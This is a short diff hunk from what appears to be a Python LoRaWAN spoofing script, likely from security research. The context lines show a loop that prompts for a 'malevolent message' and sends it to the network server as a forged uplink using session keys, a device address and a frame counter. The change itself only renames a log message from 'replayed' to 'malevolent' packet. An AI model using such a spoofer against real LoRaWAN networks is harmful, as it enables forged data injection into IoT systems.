@@ -128,5 +128,5 @@ while True:
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     mal_msg = input("Insert malevolent message:")
     Fcnt = uncofirmed_uplink(AppSKey, NwkSKey, DevAddr, FCnt, mal_msg)
-    print("[SPOOFER] Sending replayed packet to NS")
+    print("[SPOOFER] Sending malevolent packet to NS")
     print("-------------------------------------------------")
